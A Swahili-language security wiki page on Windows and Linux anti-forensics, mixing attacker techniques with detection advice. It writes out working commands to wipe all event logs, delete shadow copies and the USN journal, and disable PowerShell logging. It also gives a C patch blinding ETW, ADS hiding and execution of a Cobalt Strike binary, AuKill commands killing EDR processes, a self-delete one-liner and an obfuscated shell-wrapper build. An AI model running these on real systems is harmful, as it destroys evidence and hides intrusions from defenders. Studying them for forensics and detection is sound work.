# Mbinu za Kupinga Uchunguzi wa Kiforensiki

{{#include ../../banners/hacktricks-training.md}}

## Mihuri ya Muda

Mshambuliaji anaweza kutaka **kubadilisha mihuri ya muda ya faili** ili asigunduliwe.\
Inawezekana kupata mihuri ya muda ndani ya MFT, katika sifa za `$STANDARD_INFORMATION` \_\_ na \_\_ `$FILE_NAME`.

Sifa zote mbili zina mihuri 4 ya muda: **Marekebisho**, **ufikiaji**, **uundaji**, na **marekebisho ya sajili ya MFT** (MACE au MACB).

**Windows explorer** na zana nyingine huonyesha taarifa kutoka kwenye **`$STANDARD_INFORMATION`**.

### TimeStomp - Zana ya Kupinga Uchunguzi wa Kiforensiki

Zana hii **hubadilisha** taarifa za mihuri ya muda ndani ya **`$STANDARD_INFORMATION`** **lakini** **haibadilishi** taarifa zilizo ndani ya **`$FILE_NAME`**. Kwa hiyo, inawezekana **kutambua** **shughuli** **zinazotiliwa shaka**.

### Usnjrnl

**USN Journal** (Jarida la Nambari ya Mfuatano wa Usasishaji) ni kipengele cha NTFS (mfumo wa faili wa Windows NT) kinachofuatilia mabadiliko ya volumu. Zana ya [**UsnJrnl2Csv**](https://github.com/jschicht/UsnJrnl2Csv) huruhusu uchunguzi wa mabadiliko haya.

![TimeStomp - Zana ya Kupinga Uchunguzi wa Kiforensiki - Usnjrnl: USN Journal (Jarida la Nambari ya Mfuatano wa Usasishaji) ni kipengele cha NTFS (mfumo wa faili wa Windows NT) kinachofuatilia mabadiliko ya volumu. ...](<../../images/image (801).png>)

Picha iliyotangulia inaonyesha **matokeo** ya **zana**, ambapo inaonekana kuwa **baadhi ya mabadiliko yalifanywa** kwenye faili.

### $LogFile

**Mabadiliko yote ya metadata kwenye mfumo wa faili hurekodiwa** katika mchakato unaojulikana kama [write-ahead logging](https://en.wikipedia.org/wiki/Write-ahead_logging). Metadata iliyorekodiwa huhifadhiwa katika faili inayoitwa `**$LogFile**`, iliyoko kwenye saraka kuu ya mfumo wa faili wa NTFS. Zana kama [LogFileParser](https://github.com/jschicht/LogFileParser) zinaweza kutumiwa kuchanganua faili hii na kutambua mabadiliko.

![Usnjrnl - $LogFile: Mabadiliko yote ya metadata kwenye mfumo wa faili hurekodiwa katika mchakato unaojulikana kama write-ahead logging. Metadata iliyorekodiwa huhifadhiwa katika faili inayoitwa $LogFile , iliyoko kwenye saraka kuu...](<../../images/image (137).png>)

Tena, kwenye matokeo ya zana inawezekana kuona kwamba **baadhi ya mabadiliko yalifanywa**.

Kwa kutumia zana hiyo hiyo, inawezekana kutambua **mihuri ya muda ilibadilishwa hadi wakati gani**:

![Usnjrnl - $LogFile: Kwa kutumia zana hiyo hiyo, inawezekana kutambua mihuri ya muda ilibadilishwa hadi wakati gani](<../../images/image (1089).png>)

- CTIME: Muda wa kuundwa kwa faili
- ATIME: Muda wa marekebisho ya faili
- MTIME: Muda wa marekebisho ya sajili ya MFT ya faili
- RTIME: Muda wa ufikiaji wa faili

### Ulinganisho wa `$STANDARD_INFORMATION` na `$FILE_NAME`

Njia nyingine ya kutambua faili zilizobadilishwa kwa namna inayotiliwa shaka ni kulinganisha muda katika sifa zote mbili ili kutafuta **kutolingana**.

### Nanosekunde

Mihuri ya muda ya **NTFS** ina **usahihi** wa **nanosekunde 100**. Kwa hiyo, kupata faili zenye mihuri ya muda kama 2010-10-10 10:10:**00.000:0000 kunatia shaka sana**.

### SetMace - Zana ya Kupinga Uchunguzi wa Kiforensiki

Zana hii inaweza kubadilisha sifa zote mbili, `$STARNDAR_INFORMATION` na `$FILE_NAME`. Hata hivyo, kuanzia Windows Vista, OS inayotumika inahitajika ili kurekebisha taarifa hii.

## Kuficha Data

NFTS hutumia klasta na ukubwa wa chini kabisa wa taarifa. Hiyo inamaanisha kuwa ikiwa faili inatumia klasta moja na nusu, **nusu iliyobaki haitatumika kamwe** hadi faili ifutwe. Kwa hiyo, inawezekana **kuficha data katika nafasi hii ya slack**.

Kuna zana kama slacker zinazowezesha kuficha data katika nafasi hii "iliyofichwa". Hata hivyo, uchanganuzi wa `$logfile` na `$usnjrnl` unaweza kuonyesha kuwa data fulani iliongezwa:

![SetMace - Zana ya Kupinga Uchunguzi wa Kiforensiki - Kuficha Data: Kuna zana kama slacker zinazowezesha kuficha data katika nafasi hii "iliyofichwa". Hata hivyo, uchanganuzi wa $logfile na $usnjrnl unaweza kuonyesha kuwa...](<../../images/image (1060).png>)

Kisha, inawezekana kupata nafasi ya slack kwa kutumia zana kama FTK Imager. Kumbuka kuwa aina hii ya zana inaweza kuhifadhi maudhui yakiwa yamefichwa au hata yamesimbwa kwa njia fiche.

## UsbKill

Hii ni zana ambayo **huzima kompyuta ikitambua mabadiliko yoyote kwenye** milango ya USB.\
Njia moja ya kugundua hili ni kukagua michakato inayoendeshwa na **kupitia kila script ya python inayotekelezwa**.

## Usambazaji wa Linux wa Moja kwa Moja

Distros hizi **hutekelezwa ndani ya kumbukumbu ya RAM**. Njia pekee ya kuzitambua ni **ikiwa mfumo wa faili wa NTFS umewekwa kwa ruhusa za kuandika**. Ukiwekwa kwa ruhusa za kusoma pekee, haitawezekana kutambua uvamizi huo.

## Ufutaji Salama

[https://github.com/Claudio-C/awesome-data-sanitization](https://github.com/Claudio-C/awesome-data-sanitization)

### Kujifuta kwa Windows kwa Kucheleweshwa

Picha ya Windows inayoendeshwa inaweza kufungwa wakati mchakato wake unatumika. Mchakato unaweza kukabidhi ufutaji kwa `cmd.exe` ya mtoto, kutumia `choice` kama kipima muda, kisha kutoka kabla shell haijafikia `del`. Ucheleweshaji huipa picha ya awali nafasi ya kuachilia handle yake; kuweka njia nzima ndani ya alama za nukuu ni muhimu ikiwa ina nafasi.<sup>[[6]](#references)[[7]](#references)[[8]](#references)</sup>

```cmd
cmd.exe /C choice /C Y /N /D Y /T 6 ^>nul ^& Del /F /Q "<full-path-of-current-executable>"
```

Wakati mfuatano huu unatolewa moja kwa moja kama hoja kwa `cmd.exe` badala ya kuandikwa kutoka kwenye kidokezo kingine cha `cmd` kinachoingiliana, tumia `&` badala ya `^&` na `>nul` badala ya `^>nul`. Hii huondoa ingizo la saraka; **si ufutaji salama** na haiondoi athari za utekelezaji, kazi, jarida la mfumo wa faili au athari nyingine za uchunguzi wa kidijitali. Tafuta michakato `cmd.exe` ya muda mfupi ambayo mstari wake wa amri unachanganya `choice /T`, `Del` na njia ya picha ya mzazi.<sup>[[6]](#references)[[7]](#references)[[8]](#references)</sup>

## Usanidi wa Windows

Inawezekana kuzima mbinu kadhaa za uwekaji kumbukumbu za Windows ili kufanya uchunguzi wa kidijitali kuwa mgumu zaidi.

### Zima Mihuri ya Muda - UserAssist

Huu ni ufunguo wa sajili unaohifadhi tarehe na saa ambazo kila programu tekelezi iliendeshwa na mtumiaji.

Kuzima UserAssist kunahitaji hatua mbili:

1. Weka funguo hizi mbili za sajili, `HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Advanced\Start_TrackProgs` na `HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Advanced\Start_TrackEnabled`, zote kuwa sifuri ili kuashiria kuwa tunataka UserAssist izimwe.
2. Futa miti midogo ya sajili inayofanana na `HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\UserAssist\<hash>`.

### Zima Mihuri ya Muda - Prefetch

Hii huhifadhi maelezo kuhusu programu zilizotekelezwa kwa lengo la kuboresha utendaji wa mfumo wa Windows. Hata hivyo, maelezo haya yanaweza pia kuwa muhimu katika uchunguzi wa kidijitali.

- Tekeleza `regedit`
- Chagua njia ya faili `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SessionManager\Memory Management\PrefetchParameters`
- Bofya kulia `EnablePrefetcher` na `EnableSuperfetch`
- Chagua Modify kwa kila moja ili kubadilisha thamani kutoka 1 (au 3) hadi 0
- Anzisha upya

### Zima Mihuri ya Muda - Last Access Time

Kila folda inapofunguliwa kutoka kwenye ujazo wa NTFS kwenye seva ya Windows NT, mfumo huchukua muda **kusasisha sehemu ya muhuri wa muda kwenye kila folda iliyoorodheshwa**, inayoitwa muda wa ufikiaji wa mwisho. Kwenye ujazo wa NTFS unaotumika sana, hili linaweza kuathiri utendaji.

1. Fungua Registry Editor (Regedit.exe).
2. Nenda kwenye `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\FileSystem`.
3. Tafuta `NtfsDisableLastAccessUpdate`. Ikiwa haipo, ongeza DWORD hii na uweke thamani yake kuwa 1, jambo litakalizima mchakato huo.
4. Funga Registry Editor, kisha anzisha upya seva.

### Futa Historia ya USB

**Ingizo zote za vifaa vya USB** huhifadhiwa kwenye Windows Registry chini ya ufunguo wa sajili **USBSTOR**, ambao una funguo ndogo zinazoundwa kila unapochomeka kifaa cha USB kwenye PC au Laptop yako. Unaweza kupata ufunguo huu hapa H`KEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Enum\USBSTOR`. **Kuufuta** kutafuta historia ya USB.\
Unaweza pia kutumia zana ya [**USBDeview**](https://www.nirsoft.net/utils/usb_devices_view.html) kuhakikisha kwamba umezifuta (na kuzifuta).

Faili nyingine inayohifadhi maelezo kuhusu USB ni `setupapi.dev.log`, iliyo ndani ya `C:\Windows\INF`. Hii pia inapaswa kufutwa.

### Zima Shadow Copies

**Orodhesha** shadow copies kwa `vssadmin list shadowstorage`\
**Yafute** kwa kutekeleza `vssadmin delete shadow`

Unaweza pia kuyafuta kupitia GUI kwa kufuata hatua zilizopendekezwa kwenye [https://www.ubackup.com/windows-10/how-to-delete-shadow-copies-windows-10-5740.html](https://www.ubackup.com/windows-10/how-to-delete-shadow-copies-windows-10-5740.html)

Kuzima shadow copies [hatua kutoka hapa](https://support.waters.com/KB_Inf/Other/WKB15560_How_to_disable_Volume_Shadow_Copy_Service_VSS_in_Windows):

1. Fungua programu ya Services kwa kuandika "services" kwenye kisanduku cha kutafutia maandishi baada ya kubofya kitufe cha kuanza cha Windows.
2. Kwenye orodha, tafuta "Volume Shadow Copy", iteue, kisha ufungue Properties kwa kubofya kulia.
3. Chagua Disabled kwenye menyu kunjuzi ya "Startup type", kisha thibitisha mabadiliko kwa kubofya Apply na OK.

Pia inawezekana kubadilisha usanidi wa faili zitakazonakiliwa kwenye shadow copy kupitia sajili `HKLM\SYSTEM\CurrentControlSet\Control\BackupRestore\FilesNotToSnapshot`

### Andika Juu ya Faili Zilizofutwa

- Unaweza kutumia **zana ya Windows**: `cipher /w:C` Hii itaelekeza cipher kuondoa data yoyote kutoka kwenye nafasi ya diski isiyotumika inayopatikana kwenye hifadhi ya C.
- Unaweza pia kutumia zana kama [**Eraser**](https://eraser.heidi.ie)

### Futa Kumbukumbu za Matukio za Windows

- Windows + R --> eventvwr.msc --> Panua "Windows Logs" --> Bofya kulia kila kategoria na uchague "Clear Log"
- `for /F "tokens=*" %1 in ('wevtutil.exe el') DO wevtutil.exe cl "%1"`
- `Get-EventLog -LogName * | ForEach { Clear-EventLog $_.Log }`

### Zima Kumbukumbu za Matukio za Windows

- `reg add 'HKLM\\SYSTEM\\CurrentControlSet\\Services\\eventlog' /v Start /t REG_DWORD /d 4 /f`
- Kwenye sehemu ya huduma, zima huduma ya "Windows Event Log"
- `WEvtUtil.exec clear-log` au `WEvtUtil.exe cl`

### Zima $UsnJrnl

- `fsutil usn deletejournal /d c:`

---

## Uwekaji Kumbukumbu wa Kina na Ughushi wa Rekodi za Ufuatiliaji (2023-2025)

### Uwekaji Kumbukumbu wa PowerShell ScriptBlock/Module

Matoleo ya hivi karibuni ya Windows 10/11 na Windows Server huhifadhi **rekodi nyingi za uchunguzi wa kidijitali za PowerShell** chini ya
`Microsoft-Windows-PowerShell/Operational` (matukio 4104/4105/4106).  
Washambuliaji wanaweza kuzizima au kuzifuta papo hapo:

```powershell
# Turn OFF ScriptBlock & Module logging (registry persistence)
New-ItemProperty -Path "HKLM:\\SOFTWARE\\Microsoft\\PowerShell\\3\\PowerShellEngine" \
                 -Name EnableScriptBlockLogging -Value 0 -PropertyType DWord -Force
New-ItemProperty -Path "HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows\\PowerShell\\ModuleLogging" \
                 -Name EnableModuleLogging -Value 0 -PropertyType DWord -Force

# In-memory wipe of recent PowerShell logs
Get-WinEvent -LogName 'Microsoft-Windows-PowerShell/Operational' |
  Remove-WinEvent               # requires admin & Win11 23H2+
```

Watetezi wanapaswa kufuatilia mabadiliko kwenye registry keys hizo na kufutwa kwa wingi kwa PowerShell events.

### ETW (Event Tracing for Windows) Patch

Bidhaa za usalama wa endpoint hutegemea sana ETW. Mbinu maarufu ya kukwepa ugunduzi ya mwaka 2024 ni kufanya patch ya `ntdll!EtwEventWrite`/`EtwEventWriteFull` kwenye memory ili kila mwito wa ETW urudishe `STATUS_SUCCESS` bila kutoa tukio:<sup>[[5]](#references)</sup>

```c
// 0xC3 = RET on x64
unsigned char patch[1] = { 0xC3 };
WriteProcessMemory(GetCurrentProcess(),
                   GetProcAddress(GetModuleHandleA("ntdll.dll"), "EtwEventWrite"),
                   patch, sizeof(patch), NULL);
```

Public PoCs (kwa mfano, `EtwTiSwallow`) hutumia primitive hiyo hiyo katika PowerShell au C++.  
Kwa kuwa patch hii ni **ya ndani ya process**, EDR zinazoendesha ndani ya process nyingine zinaweza zisiweze kuigundua.<sup>[[5]](#references)</sup>  
Ugunduzi: linganisha `ntdll` iliyo kwenye memory na iliyo kwenye diski, au weka hook kabla ya user-mode.

### Kufufuka kwa Alternate Data Streams (ADS)

Kampeni za malware mwaka 2023 (kwa mfano, loaders za **FIN12**) zimeonekana zikiweka binaries za awamu ya pili ndani ya ADS ili zisigunduliwe na scanner za kawaida:

```cmd
rem Hide cobalt.bin inside an ADS of a PDF
type cobalt.bin > report.pdf:win32res.dll
rem Execute directly
wmic process call create "cmd /c report.pdf:win32res.dll"
```

Hesabu streams kwa kutumia `dir /R`, `Get-Item -Stream *`, au Sysinternals `streams64.exe`.
Kunakili faili ya host kwenye FAT/exFAT au kupitia SMB kutaondoa stream iliyofichwa, na wachunguzi wanaweza kutumia njia hii kurejesha payload.

### BYOVD & “AuKill” (2023)

Bring-Your-Own-Vulnerable-Driver sasa hutumiwa mara kwa mara kwa **anti-forensics** katika mashambulizi ya ransomware.  
Zana ya open-source **AuKill** hupakia driver iliyosainiwa lakini iliyo hatarini (`procexp152.sys`) ili kusimamisha au kukatisha EDR na vitambuzi vya forensic **kabla ya usimbaji fiche na uharibifu wa log**:<sup>[[1]](#references)</sup>

```cmd
AuKill.exe -e "C:\\Program Files\\Windows Defender\\MsMpEng.exe"
AuKill.exe -k CrowdStrike
```

Driver huondolewa baadaye, na kuacha mabaki machache.<sup>[[1]](#references)</sup>  
Hatua za kupunguza hatari: washa orodha ya Microsoft ya madereva hatarishi (HVCI/SAC),
na toa tahadhari kuhusu uundaji wa huduma za kernel kutoka kwenye njia ambazo watumiaji wanaweza kuandika.

---

## Linux Anti-Forensics: Kujifanyia patch na Cloud C2 (2023–2025)

### Kujifanyia patch huduma zilizoathiriwa ili kupunguza ugunduzi (Linux)
Washambuliaji wanazidi “kujifanyia patch” huduma mara tu baada ya kuzi-exploit, ili kuzuia ku-exploitwa tena na kukandamiza ugunduzi unaotegemea udhaifu. Wazo ni kubadilisha vipengele vilivyo hatarini kwa binaries/JARs halali za hivi punde kutoka upstream, ili scanners ziripoti kuwa host imewekewa patch huku persistence na C2 vikiendelea.<sup>[[3]](#references)</sup>

Mfano: Apache ActiveMQ OpenWire RCE (CVE‑2023‑46604).<sup>[[3]](#references)[[4]](#references)</sup>
- Baada ya exploitation, washambuliaji walipakua JARs halali kutoka Maven Central (repo1.maven.org), wakafuta JARs zilizo hatarini kwenye usakinishaji wa ActiveMQ, kisha wakawasha upya broker.
- Hii ilifunga RCE ya awali huku footholds nyingine zikiendelea kuwepo (cron, mabadiliko ya usanidi wa SSH, implants tofauti za C2).

Mfano wa kiutendaji (wa kuonyesha)
```bash
# ActiveMQ install root (adjust as needed)
AMQ_DIR=/opt/activemq
cd "$AMQ_DIR"/lib

# Fetch patched JARs from Maven Central (versions as appropriate)
curl -fsSL -O https://repo1.maven.org/maven2/org/apache/activemq/activemq-client/5.18.3/activemq-client-5.18.3.jar
curl -fsSL -O https://repo1.maven.org/maven2/org/apache/activemq/activemq-openwire-legacy/5.18.3/activemq-openwire-legacy-5.18.3.jar

# Remove vulnerable files and ensure the service uses the patched ones
rm -f activemq-client-5.18.2.jar activemq-openwire-legacy-5.18.2.jar || true
ln -sf activemq-client-5.18.3.jar activemq-client.jar
ln -sf activemq-openwire-legacy-5.18.3.jar activemq-openwire-legacy.jar

# Apply changes without removing persistence
systemctl restart activemq || service activemq restart
```

Vidokezo vya uchunguzi wa kidijitali/uwindaji
- Kagua saraka za huduma ili kubaini ubadilishaji wa binary/JAR usiopangwa:
  - Debian/Ubuntu: `dpkg -V activemq` na ulinganishe hash/njia za faili na mirror za repo.
  - RHEL/CentOS: `rpm -Va 'activemq*'`
  - Tafuta matoleo ya JAR yaliyopo kwenye diski ambayo hayamilikiwi na package manager, au symbolic link zilizosasishwa nje ya utaratibu.
- Ratiba ya matukio: `find "$AMQ_DIR" -type f -printf '%TY-%Tm-%Td %TH:%TM %p\n' | sort` ili kulinganisha ctime/mtime na kipindi cha uvamizi.
- Historia ya shell/telemetry ya michakato: ushahidi wa `curl`/`wget` kwenda `repo1.maven.org` au CDN nyingine za artifact mara tu baada ya matumizi ya awali ya udhaifu.
- Usimamizi wa mabadiliko: thibitisha ni nani aliyetumia “patch” na kwa nini, si kuthibitisha tu kwamba toleo lenye patch lipo.

### C2 ya huduma za wingu yenye bearer token na stager za kukwepa uchanganuzi
Mbinu za uendeshaji zilizozingatiwa zilichanganya njia nyingi za C2 za muda mrefu na ufungashaji wa kukwepa uchanganuzi:<sup>[[3]](#references)</sup>
- ELF loader za PyInstaller zilizolindwa kwa nenosiri ili kuzuia sandboxing na uchanganuzi tuli (kwa mfano, PYZ iliyosimbwa fiche, uchimbaji wa muda chini ya `/_MEI*`).
  - Viashiria: matokeo ya `strings` kama `PyInstaller`, `pyi-archive`, `PYZ-00.pyz`, `MEIPASS`.
  - Mabaki ya wakati wa utekelezaji: uchimbaji kwenda `/tmp/_MEI*` au njia maalum za `--runtime-tmpdir`.
- C2 inayotumia Dropbox, ikiwa na OAuth Bearer token zilizowekwa moja kwa moja kwenye msimbo
  - Viashiria vya mtandao: `api.dropboxapi.com` / `content.dropboxapi.com` yenye `Authorization: Bearer <token>`.
  - Tafuta kwenye proxy/NetFlow/Zeek/Suricata miunganisho ya HTTPS inayotoka kwenda kwenye domain za Dropbox kutoka kwenye workload za seva ambazo kwa kawaida hazisawazishi faili.
- C2 sambamba/ya akiba kupitia tunneling (kwa mfano, Cloudflare Tunnel `cloudflared`), ili kudumisha udhibiti iwapo chaneli moja itazuiwa.
  - IOC za host: michakato/unit za `cloudflared`, usanidi kwenye `~/.cloudflared/*.json`, na muunganisho unaotoka wa 443 kwenda kwenye Cloudflare edge.

### Kudumu na “kurudisha nyuma uimarishaji” ili kudumisha ufikiaji (mifano ya Linux)
Washambuliaji mara nyingi huunganisha kujifanyia patch na njia za kudumu za ufikiaji:<sup>[[3]](#references)</sup>
- Cron/Anacron: mabadiliko kwenye stub ya `0anacron` katika kila saraka ya `/etc/cron.*/` kwa ajili ya utekelezaji wa mara kwa mara.
  - Tafuta:
    ```bash
    for d in /etc/cron.*; do [ -f "$d/0anacron" ] && stat -c '%n %y %s' "$d/0anacron"; done
    grep -R --line-number -E 'curl|wget|python|/bin/sh' /etc/cron.*/* 2>/dev/null
    ```
- Kurejesha nyuma uimarishaji wa usanidi wa SSH: kuwezesha root kuingia na kubadilisha shells chaguomsingi za akaunti zisizo na upendeleo mkubwa.
  - Tafuta dalili za kuwezeshwa kwa root kuingia:
    ```bash
    grep -E '^\s*PermitRootLogin' /etc/ssh/sshd_config
    # flag values like "yes" or overly permissive settings
    ```
  - Tafuta interactive shells zinazotiliwa shaka kwenye akaunti za mfumo (kwa mfano, `games`):
    ```bash
    awk -F: '($7 ~ /bin\/(sh|bash|zsh)/ && $1 ~ /^(games|lp|sync|shutdown|halt|mail|operator)$/) {print}' /etc/passwd
    ```
- Beacon artifacts za nasibu zenye majina mafupi (herufi 8 za alfabeti), zinazohifadhiwa kwenye diski na pia kuwasiliana na cloud C2:
  - Tafuta:
    ```bash
    find / -maxdepth 3 -type f -regextype posix-extended -regex '.*/[A-Za-z]{8}$' \
      -exec stat -c '%n %s %y' {} \; 2>/dev/null | sort
    ```

Walinzi wanapaswa kuoanisha mabaki haya na matukio ya kufichuliwa kwa nje na kuwekwa kwa viraka vya huduma ili kugundua kujirekebisha kwa njia za kupinga uchunguzi wa kidijitali kunakotumika kuficha unyonyaji wa awali.

## Utekelezaji wa shell iliyopachikwa tuli

Kifungashio cha script chenye interpreter iliyopachikwa na utekelezaji wa amri kinaweza kuendesha shughuli za shell zinazoungwa mkono ndani ya faili moja inayoweza kutekelezwa, badala ya kuzindua `/bin/sh` na michakato tofauti ya zana. HimitsuShell huunda binary tuli ya musl ya aina hii. Tofauti na [vifungashio vya SHc](../../linux-hardening/processes-crontab-systemd-dbus/cron-and-systemd-timers.md), amri zake zilizojengewa ndani hazihitaji kuanzisha shell ya host au mchakato tofauti wa zana. Amri zisizoungwa mkono zinaweza kutumia shell ya mfumo kama njia mbadala.<sup>[[9]](#references)</sup>

Hii hupunguza uonekano wa michakato ya shell na michakato tanzu ya `execve`.<sup>[[9]](#references)</sup> Mchakato wa kifungashio na miito yake ya mfumo bado inaweza kuonekana kupitia kernel tracepoints, kwa hiyo dai la mradi kwamba hauonekani hata kwa ufuatiliaji wa kernel halipaswi kuchukuliwa kihalisi.<sup>[[9]](#references)[[11]](#references)</sup>

Kwa build iliyorekodiwa ya x86_64, iache ingizo likiwa na jina `launcher.sh` na linakili kwenye container kabla ya kuikompile. Matokeo ni `safeLauncher`:<sup>[[9]](#references)</sup>

```bash
curl -LO https://github.com/HimitsuShell/Himitsu/releases/download/v2.1.0/himitsu_core_x86_64_linux_musl.tar.gz
docker load -i himitsu_core_x86_64_linux_musl.tar.gz
docker run --name himitsu_core -d -it himitsu_core
docker cp launcher.sh himitsu_core:/var/work/
docker exec himitsu_core /var/work/compile.sh
docker cp himitsu_core:/var/work/safeLauncher .
```

`compile.sh` ya umma husimba script kwa AES-256-CTR, husimba thamani ya muda wa kuisha na funguo/IV za kati kwa AES-256-CBC, hubadilisha faili zilizosimbwa kuwa arrays za C kwa `xxd -i`, kisha huzihusisha na `lib.bc` kwa kutumia `-static -s`. Ufunguo na IV za mwisho za usimbaji pia hupachikwa, kwa hiyo hii huzuia uchimbaji tuli wa kawaida, lakini si siri ambayo haiwezi kamwe kurejeshwa.<sup>[[10]](#references)</sup>

LLVM passes za chaguo-msingi ni `-sobf` na `-sub`. Hariri `/var/work/compile.sh` kabla ya kuijenga ili kuwezesha mbadala zilizorekodiwa, kama vile control-flow flattening (`fla`) au bogus control flow (`bcf`).<sup>[[9]](#references)[[10]](#references)</sup>

Jaribu uoanifu wa script kabla ya kutegemea wrapper hii: mradi unalenga sintaksia ya POSIX shell, unaonya kuwa scripts za Bash/Zsh zinaweza kushindwa, na unasema kuwa amri zilizo nje ya seti yake iliyojengewa ndani hutumia system shell.<sup>[[9]](#references)</sup>

Kwa uchanganuzi wa control flow iliyoflatteniwa, tazama [kupita control flow iliyoflatteniwa kwa kutumia narrow execution slice](../../reversing/reversing-tools-basic-methods/#bypass-flattened-control-flow-with-a-narrow-execution-slice).

{{#include ../../banners/hacktricks-training.md}}

## References

- [1] [Sophos X-Ops – AuKill: Dereva dhaifu iliyotumika kuzima EDR (Machi 2023)](https://news.sophos.com/en-us/2023/03/07/aukill-a-weaponized-vulnerable-driver-for-disabling-edr)
- [2] [Red Canary – Kurekebisha EtwEventWrite kwa kujificha: Ugunduzi na utafutaji wa vitisho (Juni 2024)](https://redcanary.com/blog/etw-patching-detection)
- [3] [Red Canary – Kurekebisha kwa ajili ya persistence: Jinsi malware ya DripDropper Linux inavyosambaa kwenye cloud](https://redcanary.com/blog/threat-intelligence/dripdropper-linux-malware/)
- [4] [CVE‑2023‑46604 – RCE ya Apache ActiveMQ OpenWire (NVD)](https://nvd.nist.gov/vuln/detail/CVE-2023-46604)
- [5] [Kuficha .NET yako - ETW (Adam Chester / XPN)](https://blog.xpnsec.com/hiding-your-dotnet-etw/)
- [6] [FortiGuard Labs – Kufichua lahaja ya SectopRAT iliyopachikwa kwenye programu halali](https://www.fortinet.com/blog/threat-research/uncovering-a-sectoprat-variant-embedded-in-legitimate-software)
- [7] [Microsoft Learn – amri ya choice](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/choice)
- [8] [Microsoft Learn – amri ya del](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/del)
- [9] [README ya HimitsuShell](https://github.com/HimitsuShell/HimitsuShell)
- [10] [Script ya ujenzi ya HimitsuShell](https://github.com/HimitsuShell/HimitsuShell/blob/main/inside_container/compile.sh)
- [11] [Histogramu za matukio ya Linux kernel na ufuatiliaji wa syscall](https://docs.kernel.org/trace/histogram.html)
